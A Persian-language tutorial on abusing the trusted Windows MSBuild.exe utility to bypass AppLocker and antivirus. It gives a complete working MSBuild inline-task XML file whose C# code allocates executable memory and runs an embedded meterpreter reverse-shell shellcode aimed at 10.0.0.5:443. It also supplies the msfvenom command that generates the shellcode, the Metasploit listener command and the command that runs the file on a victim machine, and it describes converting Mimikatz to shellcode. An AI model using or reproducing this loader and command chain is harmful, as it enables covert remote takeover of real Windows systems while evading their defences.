

ما برای کامپایل کردن کد های پروژه .NET خود از ابزار های مختلف microsoft visual studio میتونیم استفاده کنیم 

مثلا 

	 ces.exe
	 installutil.exe
	 MSBuild.exe
	
این پروسه ها  همشون به طور کلی فرایند کامپایل و اجرای پروژه های ما رو به طریق های مختلفی میدهند
مثلا پروسه **ces.exe*** برای ما فقط فرایند کامپایل را انجام میدهد و پروژه های .cs را برای ما بسته به هدفی که داریم میتونیم مشخص کنیم که فایل .dll یا .exe میخواهیم 
و پروسه **installutil.exe*** که یک پروسه برای install و uninstall کردن سرویس  های .Net هست و کلاس های installer که داخل فایل .dll ما هست رو برای ما اجرا میکنه و یک lolbins هم به حساب می آید
## link website --->[installutil](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)

این پروسه یک کلاس داره به اسم install یا uninstall که این کلاس  اگر درون یک فایل dll قرار بگیره محتوای درون اون کلاس install یا unstall میاد برای ما اجرا میشه که اگر کلاس install درونش یک shell code باشه ما بدون اینکه بیایم و یک فایل جداگونه بسازیم و shell code مون رو درونش قرار بدیم با این روش در اصل داریم فرایند shell code injection رو پیش میبریم 

---

اما جدا از این ها ما در مواقعی احتیاج داریم که فایل # C  مثلا درون یک فایل xml بیایم اجرا کنیم خب برای اینکار Microsoft یک پروسه یی رو ساخته که این پروسه هدفش همین کار است یعنی **MSBuild.exe** 

این پروسه هدفش کامپایل، ساخت برنامه .Net هست که میتونه پروژه های برنامه نویسی رو بر اساس فایل های : 
- `.csproj`
    
- `.vbproj`
    
- `.proj`
    
- `.targets`

 کامپایل و تبدیل به خروجی می‌کند (EXE یا DLL).

این پروسه چون یکی دیگر از پروسه های Trust ماکروسافت است پس یک روش محبوب در مبحث امنیت تهاجمی به حساب می آید که میتونیم در تاکتیک Code execution برای bypass applocker ازش استفاده کنیم 

## حالا چرا فایل های xml 

خب اگر بخواهیم قبل از اینکه بگیم چرا از این فایل ها برای بایپس کردن مکانیزم های ماننده applocker استفاده میشود و جدایی از applocker میشود راهکاری هایی ماننده AV/EDR رو هم باهاش دور زد به شرط obfusticate روی API ها دورن برنامه، بیایم در مورد خوده فایل های XML بیشتر توضیح بدیم که دقیقا چی هستند و چرا انقدر کلا تو بحث زیر سخات (DevOps) و فایل های سیستمی ازش استفاده میشود 
## XML

قبل از اینکه فایل XML یا همون (eXtensible Markup Language) به وجود بیایند یک برنامه یی به زبان# C نمی توانست با یک سرور java صحبت کند یک application یا وب سرور python با یک یک سیستم قدیمی Legacy  صحبت کند تا اینکه XML به وجود امد و هدفش امکان برقراری ارتباط بین برنامه ها را باهم فراهم کند

در اصل فایل های XML  یک نوع زبان اشاره گداری هستند که برای 
- ذخیره‌سازی داده‌ها
    
- انتقال داده‌ها بین سیستم‌ها
    
- ساختاردهی به اطلاعات
    

طراحی شده.

## **فایل های XML یک استاندارد وسط ساخت که همه زبان‌ها و همه سیستم‌ها بتوانند یک نوع فرمت را بفهمند.**

نمونه یی از ساخت یک فایل XML 

```
<User>
    <Name>Charon</Name>
    <Role>Analyst</Role>
    <Experience>3</Experience>
</User>

```

- تگ `<User>` یک **شیء** تعریف می‌کند
    
- تگ‌های داخلش **مشخصات** آن شیء هستند
    
- همه چیز **سازمان‌دهی شده، قابل‌خواندن، و قابل‌تجزیه** است

---
## خلاصه تکنیک 
استفاده از MSBuild.exe (که یک ابزار معتبر و signed مایکروسافتی و whitelisted در همه ویندوزها است) برای کامپایل و اجرای کد C# حاوی shellcode در حافظه، بدون اینکه هیچ فایل .exe یا .dll مخربی روی دیسک بیفته.یعنی به جای اجرای powershell.exe، regsvr32، rundll32 یا cmstp، این بار از MSBuild استفاده می‌کنیم که معمولاً هیچ EDR یا آنتی‌ویروس به آن شک نمی‌کند

خب در قدم ما احتیاج داریم که بیایم و پروژه خودمون رو به زبان# C تبدیل کنیم به shell code 

برای اینکه پروژه مون رو به shell code تبدیل کنیم از پروژ های عمومی که در گیت هاب و سیستم عامل های ماننده kali linux,ParrotOS,Black Arch استفاده کنیم یا به صورت دستی از package manager های استفاده کنیم برای نصب ابزار مورد نیاز مون برای ساخت shell code 

## اما Shell Code چیه ؟

به صورت خلاصه Shell Code یک قطعه کد بسیار کوچک و سطح پایین است که معمولاً به زبان Assembly نوشته می‌شود و هدفش اجرای یک کار مشخص روی سیستم قربانی است، قبلا چون فقط میومد یک shell باز میکرد مثله cmd, poweshell و...... اسمش رو گذاشتن shell code اما  امروزه کار های پیشرفته تری انجام میدهد ماننده 

- یک مسیر فایل را باز کند
    
- برنامه اجرا کند
    
- یک اتصال Reverse بسازد
    
- Memory را دستکاری کند
    
- Payload بزرگ‌تر دانلود کند
    

و هر کاری که امکان داشته باشد.

و به طور کلی shell code یار کمکی برای ما Red Teamer ها Black Hat ها است 
و مبحث shell code در واقع نوعی از بسته بایت ها است که توسط زبان سطح پایینی یعنی Assembly تولید میشود 


## قدم 1

در اولین قدم از این تکنیک ما میایم و یک shell code میسازیم که بار این shell code یک payload revershell shell هست 

من برای اینکه shell code خودم رو بسازم از  فریمورک Cobalt Strike استفاده میکنم تا Detection کمتری رو داشته باشم اما شما میتوانید از ابزار هایی ماننده msfvenom هم استفاده کنید


---

## نکته : 

اگر هم میخواهید یک ابزار رو به shell code تبدیل کنید مثلا Mimikatz  رو به shell code تبدیل کنید، میتونید از پروژه هایی ماننده dount استفاده کنید که در اصل هدف این پروژه این است که بیاد پروژه های شما رو به صورت manage و unmanage به shell code تبدیل کنه

[Dount Project GitHub](https://github.com/TheWover/donut)


---


نمونه ساخت shell code به زبان# C با msfvenom 

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp
```

اگر از kali ورژن 2019 استفاده میکنید و update نشده است میتونید از متود encryption  AES-- در ساخت payload خودتون استفاده کنید تا  Detection توسط AV کمتر باشه اما کما کان توسط EDR ها شناسایی میشود چون به طور کلی payload های ابزار  msfvenom قدیمی و پابلیک هستند و خوده ابزار هم open source هست  اما برای شبیه سازی حمله تون کاملا خوبه 

![[image/image 1.png]]


## قدم 2 

حالا که Shell code مون رو ساختیم میایم و دورن یک فایل XML میزاریم 

نمونه فایل مخرب XML 

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    byte[] shellcode = new byte[] { 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x00,0x00,0x05,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
		      
		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>
```

مهم‌ترین بخش: CodeTaskFactory
این یک TaskFactory رسمی مایکروسافت است که اجازه می‌دهد کد C# را مستقیم داخل فایل XML بنویسی و MSBuild آن را در حافظه کامپایل و اجرا کند! (بدون نیاز به فایل .cs یا .dll)

. کد C# داخل XML چه می‌کند؟
کد یک کلاس می‌سازد که از Task ارث‌بری می‌کند و متد Execute() را override می‌کند.داخل Execute() این کارها انجام می‌شود:

تگ  کد از تگ تسک ارث میبرد و درون  تگ کد # paylod c ما قرار دارد که این کد سی شارپی میاد برای ما shell code مد نظر مون رو اجرا میکند

قسمت replace with your own shellcode از کد باید shell code ساخته خودتون رو قرار بدهید 

## قدم 3

یک listner بسازید حالا یا با NC یا با metasploit اگر هم که از cobalt Strike استفاده میکنید که خب همون موقع ساخت paylod ازتون میپرسه از چه listener استفاده میکنید 

```
msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```

اگر payload تون meterpreter هست باید از  metasploit استفاده کنید که این C2 رو داشته باشد 

## قدم آخر 

فایلی که دارید رو داخل سیستم قربانی بیاید داخل اون مسیری که پروسه msbuild وجود دارد کامپایل و اجرا کنید 

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
```

![[Peek 2019-04-04 20-57.gif]]
